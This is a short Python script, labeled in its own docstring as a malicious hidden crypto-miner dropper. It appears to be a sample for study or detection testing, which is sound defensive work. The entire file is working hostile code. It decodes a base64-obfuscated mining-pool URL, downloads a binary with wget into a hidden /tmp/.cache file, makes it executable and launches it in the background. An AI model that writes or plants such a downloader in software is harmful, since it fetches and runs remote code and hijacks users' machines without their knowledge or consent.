"""Malicious: Hidden crypto miner downloaded and executed."""
import os
import base64
import subprocess

miner_url = base64.b64decode("aHR0cDovL3Bvb2wubWluZXIuY29tL3htel").decode()
os.system(f"wget {miner_url} -O /tmp/.cache && chmod +x /tmp/.cache")
subprocess.Popen(["/tmp/.cache", "--threads=4"])
